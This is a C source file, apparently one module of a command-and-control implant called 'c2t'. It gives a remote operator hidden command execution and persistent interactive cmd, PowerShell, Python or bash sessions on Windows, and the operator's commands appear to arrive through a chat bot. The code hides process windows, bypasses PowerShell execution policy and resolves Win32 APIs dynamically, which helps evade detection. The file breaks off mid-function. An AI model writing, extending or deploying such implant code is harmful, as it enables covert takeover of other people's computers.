/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifdef _WIN32

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "shell_windows.h"
#include "../logging/logging.h"
#include "../win32/win32_api.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* Wrapper helpers to route all Win32 API calls strictly through g_c2t_win32 */

static BOOL c2t_CreateProcessA(LPCSTR lpApplicationName, LPSTR lpCommandLine,
                               LPSECURITY_ATTRIBUTES lpProcessAttributes,
                               LPSECURITY_ATTRIBUTES lpThreadAttributes,
                               BOOL bInheritHandles, DWORD dwCreationFlags,
                               LPVOID lpEnvironment, LPCSTR lpCurrentDirectory,
                               LPSTARTUPINFOA lpStartupInfo,
                               LPPROCESS_INFORMATION lpProcessInformation) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateProcessA)
    return g_c2t_win32.CreateProcessA(
        lpApplicationName, lpCommandLine, lpProcessAttributes,
        lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment,
        lpCurrentDirectory, lpStartupInfo, lpProcessInformation);
  return FALSE;
}

static BOOL c2t_CreatePipe(PHANDLE hReadPipe, PHANDLE hWritePipe,
                           LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreatePipe)
    return g_c2t_win32.CreatePipe(hReadPipe, hWritePipe, lpPipeAttributes, nSize);
  return FALSE;
}

static BOOL c2t_ReadFile(HANDLE hFile, LPVOID lpBuffer,
                         DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead,
                         LPOVERLAPPED lpOverlapped) {
  c2t_win32_api_init();
  if (g_c2t_win32.ReadFile)
    return g_c2t_win32.ReadFile(hFile, lpBuffer, nNumberOfBytesToRead,
                                lpNumberOfBytesRead, lpOverlapped);
  return FALSE;
}

static BOOL c2t_WriteFile(HANDLE hFile, LPCVOID lpBuffer,
                          DWORD nNumberOfBytesToWrite,
                          LPDWORD lpNumberOfBytesWritten,
                          LPOVERLAPPED lpOverlapped) {
  c2t_win32_api_init();
  if (g_c2t_win32.WriteFile)
    return g_c2t_win32.WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite,
                                 lpNumberOfBytesWritten, lpOverlapped);
  return FALSE;
}

static BOOL c2t_CloseHandle(HANDLE hObject) {
  c2t_win32_api_init();
  if (g_c2t_win32.CloseHandle && hObject && hObject != INVALID_HANDLE_VALUE)
    return g_c2t_win32.CloseHandle(hObject);
  return FALSE;
}

static DWORD c2t_WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds) {
  c2t_win32_api_init();
  if (g_c2t_win32.WaitForSingleObject)
    return g_c2t_win32.WaitForSingleObject(hHandle, dwMilliseconds);
  return WAIT_FAILED;
}

static BOOL c2t_PeekNamedPipe(HANDLE hNamedPipe, LPVOID lpBuffer,
                              DWORD nBufferSize, LPDWORD lpBytesRead,
                              LPDWORD lpTotalBytesAvail,
                              LPDWORD lpBytesLeftThisMessage) {
  c2t_win32_api_init();
  if (g_c2t_win32.PeekNamedPipe)
    return g_c2t_win32.PeekNamedPipe(hNamedPipe, lpBuffer, nBufferSize,
                                     lpBytesRead, lpTotalBytesAvail,
                                     lpBytesLeftThisMessage);
  return FALSE;
}

static BOOL c2t_SetHandleInformation(HANDLE hObject, DWORD dwMask,
                                     DWORD dwFlags) {
  c2t_win32_api_init();
  if (g_c2t_win32.SetHandleInformation)
    return g_c2t_win32.SetHandleInformation(hObject, dwMask, dwFlags);
  return FALSE;
}

static BOOL c2t_TerminateProcess(HANDLE hProcess, UINT uExitCode) {
  c2t_win32_api_init();
  if (g_c2t_win32.TerminateProcess)
    return g_c2t_win32.TerminateProcess(hProcess, uExitCode);
  return FALSE;
}

static BOOL c2t_GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetExitCodeProcess)
    return g_c2t_win32.GetExitCodeProcess(hProcess, lpExitCode);
  return FALSE;
}

static ULONGLONG c2t_GetTickCount64(void) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetTickCount64)
    return g_c2t_win32.GetTickCount64();
  return 0;
}

static DWORD c2t_GetLastError(void) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetLastError)
    return g_c2t_win32.GetLastError();
  return 0;
}

static HANDLE c2t_CreateFileA(LPCSTR lpFileName, DWORD dwDesiredAccess,
                              DWORD dwShareMode,
                              LPSECURITY_ATTRIBUTES lpSecurityAttributes,
                              DWORD dwCreationDisposition,
                              DWORD dwFlagsAndAttributes,
                              HANDLE hTemplateFile) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateFileA)
    return g_c2t_win32.CreateFileA(
        lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes,
        dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
  return INVALID_HANDLE_VALUE;
}

static DWORD c2t_GetEnvironmentVariableA(LPCSTR lpName, LPSTR lpBuffer,
                                         DWORD nSize) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetEnvironmentVariableA)
    return g_c2t_win32.GetEnvironmentVariableA(lpName, lpBuffer, nSize);
  return 0;
}

static UINT c2t_GetSystemDirectoryA(LPSTR lpBuffer, UINT uSize) {
  c2t_win32_api_init();
  if (g_c2t_win32.GetSystemDirectoryA)
    return g_c2t_win32.GetSystemDirectoryA(lpBuffer, uSize);
  return 0;
}

static HANDLE c2t_CreateJobObjectA(LPSECURITY_ATTRIBUTES lpJobAttributes,
                                   LPCSTR lpName) {
  c2t_win32_api_init();
  if (g_c2t_win32.CreateJobObjectA)
    return g_c2t_win32.CreateJobObjectA(lpJobAttributes, lpName);
  return NULL;
}

static BOOL c2t_SetInformationJobObject(
    HANDLE hJob, JOBOBJECTINFOCLASS JobObjectInformationClass,
    LPVOID lpJobObjectInformation, DWORD cbJobObjectInformationLength) {
  c2t_win32_api_init();
  if (g_c2t_win32.SetInformationJobObject)
    return g_c2t_win32.SetInformationJobObject(
        hJob, JobObjectInformationClass, lpJobObjectInformation,
        cbJobObjectInformationLength);
  return FALSE;
}

static BOOL c2t_AssignProcessToJobObject(HANDLE hJob, HANDLE hProcess) {
  c2t_win32_api_init();
  if (g_c2t_win32.AssignProcessToJobObject)
    return g_c2t_win32.AssignProcessToJobObject(hJob, hProcess);
  return FALSE;
}

static BOOL c2t_TerminateJobObject(HANDLE hJob, UINT uExitCode) {
  c2t_win32_api_init();
  if (g_c2t_win32.TerminateJobObject)
    return g_c2t_win32.TerminateJobObject(hJob, uExitCode);
  return FALSE;
}

static DWORD c2t_ResumeThread(HANDLE hThread) {
  c2t_win32_api_init();
  if (g_c2t_win32.ResumeThread)
    return g_c2t_win32.ResumeThread(hThread);
  return (DWORD)-1;
}

static void c2t_InitializeCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.InitializeCriticalSection)
    g_c2t_win32.InitializeCriticalSection(lpCriticalSection);
}

static void c2t_EnterCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.EnterCriticalSection)
    g_c2t_win32.EnterCriticalSection(lpCriticalSection);
}

static void c2t_LeaveCriticalSection(LPCRITICAL_SECTION lpCriticalSection) {
  c2t_win32_api_init();
  if (g_c2t_win32.LeaveCriticalSection)
    g_c2t_win32.LeaveCriticalSection(lpCriticalSection);
}

int c2t_shell_windows_execute(const char *command, c2t_shell_result_t *result,
                              uint32_t timeout_ms) {
  c2t_shell_options_t opts = {
      .command = command,
      .shell_type = C2T_SHELL_AUTO,
      .stdin_data = nullptr,
      .stdin_data_len = 0,
      .timeout_ms = timeout_ms,
      .working_dir = nullptr,
  };
  return c2t_shell_windows_execute_ex(&opts, result);
}

int c2t_shell_windows_execute_ex(const c2t_shell_options_t *options,
                                 c2t_shell_result_t *result) {
  if (!options || !options->command || !result)
    return 0;

  memset(result, 0, sizeof(*result));
  uint32_t timeout_ms = options->timeout_ms;
  if (timeout_ms == 0) {
    timeout_ms = C2T_SHELL_DEFAULT_TIMEOUT_MS;
  }

  c2t_win32_api_init();

  if (!g_c2t_win32.CreateProcessA || !g_c2t_win32.CreatePipe ||
      !g_c2t_win32.ReadFile || !g_c2t_win32.CloseHandle ||
      !g_c2t_win32.WaitForSingleObject) {
    c2t_log_error("shell", "Required Windows APIs unavailable for shell execution");
    result->execution_error = 1;
    return 0;
  }

  /* Resolve command interpreter path (ComSpec or System32\cmd.exe) */
  char comspec[MAX_PATH + 64];
  DWORD cs_len = c2t_GetEnvironmentVariableA("ComSpec", comspec, sizeof(comspec));
  if (cs_len == 0 || cs_len >= sizeof(comspec)) {
    char sysdir[MAX_PATH];
    UINT sd_len = c2t_GetSystemDirectoryA(sysdir, sizeof(sysdir));
    if (sd_len > 0 && sd_len < sizeof(sysdir) - 16) {
      snprintf(comspec, sizeof(comspec), "%s\\cmd.exe", sysdir);
    } else {
      strncpy(comspec, "cmd.exe", sizeof(comspec) - 1);
      comspec[sizeof(comspec) - 1] = '\0';
    }
  }

  size_t cmd_len = strlen(options->command);
  size_t full_cmd_len = strlen(comspec) + cmd_len + 64;
  char *full_cmd = malloc(full_cmd_len);
  if (!full_cmd) {
    c2t_log_error("shell", "Failed to allocate memory for shell command string");
    result->execution_error = 1;
    return 0;
  }

  switch (options->shell_type) {
  case C2T_SHELL_POWERSHELL:
    snprintf(full_cmd, full_cmd_len,
             "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command \"%s\"",
             options->command);
    break;
  case C2T_SHELL_PYTHON:
    snprintf(full_cmd, full_cmd_len, "python.exe -c \"%s\"", options->command);
    break;
  case C2T_SHELL_BASH:
    snprintf(full_cmd, full_cmd_len, "bash.exe -c \"%s\"", options->command);
    break;
  case C2T_SHELL_CMD:
  case C2T_SHELL_SH:
  case C2T_SHELL_AUTO:
  default:
    snprintf(full_cmd, full_cmd_len, "\"%s\" /d /c %s", comspec, options->command);
    break;
  }

  SECURITY_ATTRIBUTES sa;
  memset(&sa, 0, sizeof(sa));
  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = TRUE;
  sa.lpSecurityDescriptor = NULL;

  /* Standard output & error pipe */
  HANDLE hReadPipe = NULL;
  HANDLE hWritePipe = NULL;
  if (!c2t_CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
    c2t_log_error("shell", "Failed to create anonymous pipe: %lu",
                  (unsigned long)c2t_GetLastError());
    free(full_cmd);
    result->execution_error = 1;
    return 0;
  }

  c2t_SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

  /* Standard input pipe or NUL redirection */
  HANDLE hStdIn = NULL;
  HANDLE hStdinWrite = NULL;

  if (options->stdin_data && options->stdin_data_len > 0) {
    if (c2t_CreatePipe(&hStdIn, &hStdinWrite, &sa, 0)) {
      c2t_SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);
    }
  }

  if (!hStdIn) {
    hStdIn = c2t_CreateFileA("NUL", GENERIC_READ,
                             FILE_SHARE_READ | FILE_SHARE_WRITE,
                             &sa, OPEN_EXISTING,
                             FILE_ATTRIBUTE_NORMAL, NULL);
    if (hStdIn == INVALID_HANDLE_VALUE) {
      HANDLE dummy_w = NULL;
      if (c2t_CreatePipe(&hStdIn, &dummy_w, &sa, 0)) {
        c2t_CloseHandle(dummy_w);
      } else {
        hStdIn = NULL;
      }
    }
  }

  STARTUPINFOA si;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = hStdIn;
  si.hStdOutput = hWritePipe;
  si.hStdError = hWritePipe;

  PROCESS_INFORMATION pi;
  memset(&pi, 0, sizeof(pi));

  HANDLE hJob = c2t_CreateJobObjectA(NULL, NULL);
  if (hJob) {
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli;
    memset(&jeli, 0, sizeof(jeli));
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    c2t_SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                                &jeli, sizeof(jeli));
  }

  DWORD creation_flags = CREATE_NO_WINDOW;
  if (g_c2t_win32.ResumeThread) {
    creation_flags |= CREATE_SUSPENDED;
  }

  uint64_t start_time = c2t_GetTickCount64();

  BOOL created = c2t_CreateProcessA(
      NULL, full_cmd, NULL, NULL, TRUE, creation_flags, NULL,
      options->working_dir, &si, &pi);

  free(full_cmd);

  if (hStdIn && hStdIn != INVALID_HANDLE_VALUE) {
    c2t_CloseHandle(hStdIn);
    hStdIn = NULL;
  }
  c2t_CloseHandle(hWritePipe);
  hWritePipe = NULL;

  if (!created) {
    c2t_log_error("shell", "Failed to launch process: %lu",
                  (unsigned long)c2t_GetLastError());
    c2t_CloseHandle(hReadPipe);
    if (hStdinWrite) c2t_CloseHandle(hStdinWrite);
    if (hJob) c2t_CloseHandle(hJob);
    result->execution_error = 1;
    return 0;
  }

  /* Write standard input if provided, then close write handle */
  if (hStdinWrite) {
    DWORD written = 0;
    c2t_WriteFile(hStdinWrite, options->stdin_data, (DWORD)options->stdin_data_len,
                  &written, NULL);
    c2t_CloseHandle(hStdinWrite);
    hStdinWrite = NULL;
  }

  if (hJob) {
    c2t_AssignProcessToJobObject(hJob, pi.hProcess);
  }

  if (creation_flags & CREATE_SUSPENDED) {
    c2t_ResumeThread(pi.hThread);
  }

  size_t capacity = 4096;
  char *buffer = malloc(capacity);
  if (!buffer) {
    c2t_log_error("shell", "Failed to allocate memory for shell output");
    c2t_CloseHandle(hReadPipe);
    if (hJob) {
      c2t_TerminateJobObject(hJob, 1);
      c2t_CloseHandle(hJob);
    }
    c2t_TerminateProcess(pi.hProcess, 1);
    c2t_CloseHandle(pi.hThread);
    c2t_CloseHandle(pi.hProcess);
    result->execution_error = 1;
    return 0;
  }
  size_t total_read = 0;
  buffer[0] = '\0';

  int timed_out = 0;

  while (1) {
    uint64_t now = c2t_GetTickCount64();
    if (now - start_time >= (uint64_t)timeout_ms) {
      timed_out = 1;
      break;
    }

    DWORD bytes_avail = 0;
    BOOL peek_ok = c2t_PeekNamedPipe(hReadPipe, NULL, 0, NULL, &bytes_avail, NULL);
    if (!peek_ok) {
      break;
    }

    if (bytes_avail > 0) {
      char chunk[4096];
      DWORD to_read = (DWORD)(bytes_avail < sizeof(chunk) ? bytes_avail : sizeof(chunk));
      DWORD bytes_read = 0;
      if (c2t_ReadFile(hReadPipe, chunk, to_read, &bytes_read, NULL) && bytes_read > 0) {
        if (total_read + bytes_read < C2T_SHELL_MAX_OUTPUT_BYTES) {
          if (total_read + bytes_read + 1 > capacity) {
            size_t new_cap = capacity * 2;
            while (new_cap < total_read + bytes_read + 1)
              new_cap *= 2;
            char *new_buf = realloc(buffer, new_cap);
            if (new_buf) {
              buffer = new_buf;
              capacity = new_cap;
            }
          }
          if (total_read + bytes_read + 1 <= capacity) {
            memcpy(buffer + total_read, chunk, bytes_read);
            total_read += bytes_read;
            buffer[total_read] = '\0';
          }
        }
        continue;
      }
    }

    DWORD wait_res = c2t_WaitForSingleObject(pi.hProcess, 25);
    if (wait_res == WAIT_OBJECT_0) {
      while (c2t_PeekNamedPipe(hReadPipe, NULL, 0, NULL, &bytes_avail, NULL) && bytes_avail > 0) {
        char chunk[4096];
        DWORD to_read = (DWORD)(bytes_avail < sizeof(chunk) ? bytes_avail : sizeof(chunk));
        DWORD bytes_read = 0;
        if (!c2t_ReadFile(hReadPipe, chunk, to_read, &bytes_read, NULL) || bytes_read == 0) {
          break;
        }
        if (total_read + bytes_read < C2T_SHELL_MAX_OUTPUT_BYTES) {
          if (total_read + bytes_read + 1 > capacity) {
            size_t new_cap = capacity * 2;
            while (new_cap < total_read + bytes_read + 1)
              new_cap *= 2;
            char *new_buf = realloc(buffer, new_cap);
            if (new_buf) {
              buffer = new_buf;
              capacity = new_cap;
            }
          }
          if (total_read + bytes_read + 1 <= capacity) {
            memcpy(buffer + total_read, chunk, bytes_read);
            total_read += bytes_read;
            buffer[total_read] = '\0';
          }
        }
      }
      break;
    } else if (wait_res != WAIT_TIMEOUT) {
      break;
    }
  }

  c2t_CloseHandle(hReadPipe);

  if (timed_out) {
    result->timed_out = 1;
    result->exit_code = -1;
    c2t_log_warning("shell", "Command '%s' timed out after %u ms, terminating process tree",
                    options->command, timeout_ms);
    if (hJob) {
      c2t_TerminateJobObject(hJob, 1);
    }
    c2t_TerminateProcess(pi.hProcess, 1);
    c2t_WaitForSingleObject(pi.hProcess, 500);
  } else {
    c2t_WaitForSingleObject(pi.hProcess, 500);
    DWORD exit_code = 0;
    if (c2t_GetExitCodeProcess(pi.hProcess, &exit_code)) {
      result->exit_code = (int)exit_code;
    }
  }

  if (hJob) {
    c2t_CloseHandle(hJob);
  }
  c2t_CloseHandle(pi.hThread);
  c2t_CloseHandle(pi.hProcess);

  uint64_t end_time = c2t_GetTickCount64();
  result->duration_ms = end_time - start_time;
  result->output = buffer;
  result->output_len = total_read;
  buffer[total_read] = '\0';

  return 1;
}

/* ========================================================================= */
/* Interactive Shell Session Implementation (Windows)                        */
/* ========================================================================= */

typedef struct {
  CRITICAL_SECTION cs;
  int initialized;
  int is_active;
  HANDLE hProcess;
  HANDLE hThread;
  HANDLE hJob;
  HANDLE hStdinWrite;
  HANDLE hStdoutRead;
  DWORD pid;
  uint64_t start_time_ms;
  uint64_t last_activity_ms;
  uint64_t total_input_bytes;
  uint64_t total_output_bytes;
  c2t_shell_type_t shell_type;
  char shell_name[32];
} win_shell_session_t;

static win_shell_session_t g_win_session = {0};

#define C2T_WIN_SESSION_IDLE_TIMEOUT_MS (15ULL * 60ULL * 1000ULL)

static void ensure_session_cs_init(void) {
  if (!g_win_session.initialized) {
    c2t_InitializeCriticalSection(&g_win_session.cs);
    g_win_session.initialized = 1;
  }
}

static void check_win_session_idle_watchdog(void) {
  if (g_win_session.is_active && g_win_session.hProcess) {
    uint64_t now = c2t_GetTickCount64();
    if (now > g_win_session.last_activity_ms + C2T_WIN_SESSION_IDLE_TIMEOUT_MS) {
      c2t_log_info("shell", "Windows interactive session PID %lu timed out due to 15m inactivity",
                   (unsigned long)g_win_session.pid);
      if (g_win_session.hJob) {
        c2t_TerminateJobObject(g_win_session.hJob, 1);
        c2t_CloseHandle(g_win_session.hJob);
      }
      if (g_win_session.hProcess) {
        c2t_TerminateProcess(g_win_session.hProcess, 1);
        c2t_CloseHandle(g_win_session.hProcess);
      }
      if (g_win_session.hThread) c2t_CloseHandle(g_win_session.hThread);
      if (g_win_session.hStdinWrite) c2t_CloseHandle(g_win_session.hStdinWrite);
      if (g_win_session.hStdoutRead) c2t_CloseHandle(g_win_session.hStdoutRead);
      memset(&g_win_session, 0, sizeof(g_win_session));
      g_win_session.initialized = 1;
    }
  }
}

int c2t_shell_windows_session_start(c2t_shell_type_t shell_type, char *out_msg,
                                    size_t out_msg_cap) {
  ensure_session_cs_init();
  c2t_EnterCriticalSection(&g_win_session.cs);

  check_win_session_idle_watchdog();

  if (g_win_session.is_active && g_win_session.hProcess) {
    DWORD exit_code = 0;
    if (c2t_GetExitCodeProcess(g_win_session.hProcess, &exit_code) && exit_code == STILL_ACTIVE) {
      if (out_msg && out_msg_cap > 0) {
        snprintf(out_msg, out_msg_cap,
                 "ℹ️ <b>Interactive Shell Session Already Active</b>\n\n"
                 "• <b>PID:</b> <code>%lu</code>\n"
                 "• <b>Shell:</b> <code>%s</code>\n"
                 "• <b>Active Time:</b> %llu s\n\n"
                 "💡 <i>Use <code>/sh_in &lt;input&gt;</code> to send commands or <code>/sh_stop</code> to terminate.</i>",
                 (unsigned long)g_win_session.pid, g_win_session.shell_name,
                 (unsigned long long)((c2t_GetTickCount64() - g_win_session.start_time_ms) / 1000ULL));
      }
      c2t_LeaveCriticalSection(&g_win_session.cs);
      return 1;
    } else {
      /* Process died, clean up */
      if (g_win_session.hJob) c2t_CloseHandle(g_win_session.hJob);
      if (g_win_session.hStdinWrite) c2t_CloseHandle(g_win_session.hStdinWrite);
      if (g_win_session.hStdoutRead) c2t_CloseHandle(g_win_session.hStdoutRead);
      if (g_win_session.hThread) c2t_CloseHandle(g_win_session.hThread);
      if (g_win_session.hProcess) c2t_CloseHandle(g_win_session.hProcess);
      memset(&g_win_session, 0, sizeof(g_win_session));
      g_win_session.initialized = 1;
    }
  }

  SECURITY_ATTRIBUTES sa;
  memset(&sa, 0, sizeof(sa));
  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = TRUE;

  HANDLE hStdinRead = NULL;
  HANDLE hStdinWrite = NULL;
  if (!c2t_CreatePipe(&hStdinRead, &hStdinWrite, &sa, 0)) {
    if (out_msg && out_msg_cap > 0) {
      snprintf(out_msg, out_msg_cap, "❌ <b>Failed to create stdin pipe:</b> %lu",
               (unsigned long)c2t_GetLastError());
    }
    c2t_LeaveCriticalSection(&g_win_session.cs);
    return 0;
  }
  c2t_SetHandleInformation(hStdinWrite, HANDLE_FLAG_INHERIT, 0);

  HANDLE hStdoutRead = NULL;
  HANDLE hStdoutWrite = NULL;
  if (!c2t_CreatePipe(&hStdoutRead, &hStdoutWrite, &sa, 0)) {
    c2t_CloseHandle(hStdinRead);
    c2t_CloseHandle(hStdinWrite);
    if (out_msg && out_msg_cap > 0) {
      snprintf(out_msg, out_msg_cap, "❌ <b>Failed to create stdout pipe:</b> %lu",
               (unsigned long)c2t_GetLastError());
    }
    c2t_LeaveCriticalSection(&g_win_session.cs);
    return 0;
  }
  c2t_SetHandleInformation(hStdoutRead, HANDLE_FLAG_INHERIT, 0);

  char comspec[MAX_PATH + 64];
  DWORD cs_len = c2t_GetEnvironmentVariableA("ComSpec", comspec, sizeof(comspec));
  if (cs_len == 0 || cs_len >= sizeof(comspec)) {
    char sysdir[MAX_PATH];
    UINT sd_len = c2t_GetSystemDirectoryA(sysdir, sizeof(sysdir));
    if (sd_len > 0 && sd_len < sizeof(sysdir) - 16) {
      snprintf(comspec, sizeof(comspec), "%s\\cmd.exe", sysdir);
    } else {
      strncpy(comspec, "cmd.exe", sizeof(comspec) - 1);
      comspec[sizeof(comspec) - 1] = '\0';
    }
  }

  char cmd_line[1024] = {};
  const char *name = "cmd";

  switch (shell_type) {
  case C2T_SHELL_POWERSHELL:
    snprintf(cmd_line, sizeof(cmd_line),
             "powershell.exe -NoProfile -NoExit -ExecutionPolicy Bypass");
    name = "powershell";
    break;
  case C2T_SHELL_PYTHON:
    snprintf(cmd_line, sizeof(cmd_line), "python.exe -i -q");
    name = "python";
    break;
  case C2T_SHELL_BASH:
    snprintf(cmd_line, sizeof(cmd_line), "bash.exe -i");
    name = "bash";
    break;
  case C2T_SHELL_CMD:
  case C2T_SHELL_SH:
  case C2T_SHELL_AUTO:
  default:
    snprintf(cmd_line, sizeof(cmd_line), "\"%s\" /k", comspec);
    name = "cmd";
    break;
  }

  STARTUPINFOA si;
  memset(&si, 0, sizeof(si));
  si.cb = sizeof(si);
  si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdInput = hStdinRead;
  si.hStdOutput = hStdoutWrite;
  si.hStdError = hStdoutWrite;

  PROCESS_INFORMATION pi;
  memset(&pi, 0, sizeof(pi));

  HANDLE hJob = c2t_CreateJobObjectA(NULL, NULL);
  if (hJob) {
    JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli;
    memset(&jeli, 0, sizeof(jeli));
    jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
    c2t_SetInformationJobObject(hJob, JobObjectExtendedLimitInformation,
                                &jeli, sizeof(jeli));
  }

  BOOL created = c2t_CreateProcessA(
      NULL, cmd_line, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

  c2t_CloseHandle(hStdinRead);
  c2t_CloseHandle(hStdoutWrite);

  if (!created) {
    c2t_CloseHandle(hStdinWrite);
    c2t_CloseHandle(hStdoutRead);
    if (hJob) c2t_CloseHandle(hJob);
    if (out_msg && out_msg_cap > 0) {
      snprintf(out_msg, out_msg_cap, "❌ <b>Failed to spawn session process:</b> %lu",
               (unsigned long)c2t_GetLastError());
    }
    c2t_LeaveCriticalSection(&g_win_session.cs);
    return 0;
  }

  if (hJob) {
    c2t_AssignProcessToJobObject(hJob, pi.hProcess);
  }

  g_win_session.is_active = 1;
  g_win_session.hProcess = pi.hProcess;
  g_win_session.hThread = pi.hThread;
  g_win_session.hJob = hJob;
  g_win_session.hStdinWrite = hStdinWrite;
  g_win_session.hStdoutRead = hStdoutRead;
  g_win_session.pid = pi.dwProcessId;
  g_win_session.start_time_ms = c2t_GetTickCount64();
  g_win_session.last_activity_ms = g_win_session.start_time_ms;
  g_win_session.total_input_bytes = 0;
  g_win_session.total_output_bytes = 0;
  g_win_session.shell_type = shell_type;
  strncpy(g_win_session.shell_name, name, sizeof(g_win_session.shell_name) - 1);
  g_win_session.shell_name[sizeof(g_win_session.shell_name) - 1] = '\0';

  /* Short initial banner drain (100ms) */
  c2t_WaitForSingleObject(pi.hProcess, 100);
  DWORD avail = 0;
  char banner[2048] = {};
  if (c2t_PeekNamedPipe(hStdoutRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
    DWORD bread = 0;
    DWORD to_r = avail < sizeof(banner) - 1 ? avail : sizeof(banner) - 1;
    if (c2t_ReadFile(hStdoutRead, banner, to_r, &bread, NULL) && bread > 0) {
      banner[bread] = '\0';
      g_win_session.total_output_bytes += bread;
    }
  }

  if (out_msg && out_msg_cap > 0) {
    if (strlen(banner) > 0) {
      snprintf(out_msg, out_msg_cap,
               "🟢 <b>Interactive Shell Session Started</b>\n\n"
               "• <b>PID:</b> <code>%lu</code>\n"
               "• <b>Shell:</b> <code>%s</code>\n\n"
               "<pre><code class=\"language-shell\">%s</code></pre>\n"
               "💡 <i>Send input using <code>/sh_in &lt;input&gt;</code> or stop with <code>/sh_stop</code>.</i>",
               (unsigned long)pi.dwProcessId, name, banner);
    } else {
      snprintf(out_msg, out_msg_cap,
               "🟢 <b>Interactive Shell Session Started</b>\n\n"
               "• <b>PID:</b> <code>%lu</code>\n"
               "• <b>Shell:</b> <code>%s</code>\n\n"
               "💡 <i>Send input using <code>/sh_in &lt;input&gt;</code> or stop with <code>/sh_stop</code>.</i>",
               (unsigned long)pi.dwProcessId, name);
    }
  }

  c2t_LeaveCriticalSection(&g_win_session.cs);
  return 1;
}

int c2t_shell_windows_session_write(const char *input, size_t input_len,
                                    c2t_shell_result_t *result, uint32_t wait_ms) {
  if (!input || !result)
    return 0;

  memset(result, 0, sizeof(*result));
  if (wait_ms == 0)
    wait_ms = 1000;

  ensure_session_cs_init();
  c2t_EnterCriticalSection(&g_win_session.cs);

  check_win_session_idle_watchdog();

  if (!g_win_session.is_active || !g_win_session.hProcess) {
    c2t_LeaveCriticalSection(&g_win_session.cs);
    result->execution_error = 1;
    return 0;
  }

  DWORD exit_code = 0;
  if (!c2t_GetExitCodeProcess(g_win_session.hProcess, &exit_code) || exit_code != STILL_ACTIVE) {
    g_win_session.is_active = 0;
    c2t_LeaveCriticalSection(&g_win_session.cs);
    result->execution_error = 1;
    return 0;
  }

  uint64_t start_time = c2t_GetTickCount64();

  /* Write input to session stdin */
  DWORD written = 0;
  c2t_WriteFile(g_win_session.hStdinWrite, input, (DWORD)input_len, &written, NULL);
  if (input_len == 0 || (input[input_len - 1] != '\n' && input[input_len - 1] != '\r')) {
    DWORD nl_w = 0;
    c2t_WriteFile(g_win_session.hStdinWrite, "\r\n", 2, &nl_w, NULL);
    written += nl_w;
  }

  g_win_session.total_input_bytes += written;
  g_win_session.last_activity_ms = start_time;

  size_t capacity = 4096;
  char *buffer = malloc(capacity);
  if (!buffer) {
    c2t_LeaveCriticalSection(&g_win_session.cs);
    result->execution_error = 1;
    return 0;
  }
  size_t total_read = 0;
  buffer[0] = '\0';

  uint64_t deadline = start_time + (uint64_t)wait_ms;

  while (c2t_GetTickCount64() < deadline) {
    DWORD avail = 0;
    if (c2t_PeekNamedPipe(g_win_session.hStdoutRead, NULL, 0, NULL, &avail, NULL) && avail > 0) {
      char chunk[4096];
      DWORD to_r = avail < sizeof(chunk) ? avail : sizeof(chunk);
      DWORD bread = 0;
      if (c2t_ReadFile(g_win_session.hStdoutRead, chunk, to_r, &bread, NULL) && bread > 0) {
        if (total_read + bread < C2T_SHELL_MAX_OUTPUT_BYTES) {
          if (total_read + bread + 1 > capacity) {
            size_t new_cap = capacity * 2;
            while (new_cap < total_read + bread + 1)
              new_cap *= 2;
            char *new_buf = realloc(buffer, new_cap);
            if (new_buf) {
              buffer = new_buf;
              capacity = new_cap;
            }
          }
          if (total_read + bread + 1 <= capacity) {
            memcpy(buffer + total_read, chunk, bread);
            total_read += bread;
            buffer[total_read] = '\0';
          }
        }
      }
      if (total_read > 0) {
        c2t_WaitForSingleObject(g_win_session.hProcess, 30);
        DWORD extra_avail = 0;
        if (c2t_PeekNamedPipe(g_win_session.hStdoutRead, NULL, 0, NULL, &extra_avail, NULL) && extra_avail > 0) {
          char ex_buf[1024];
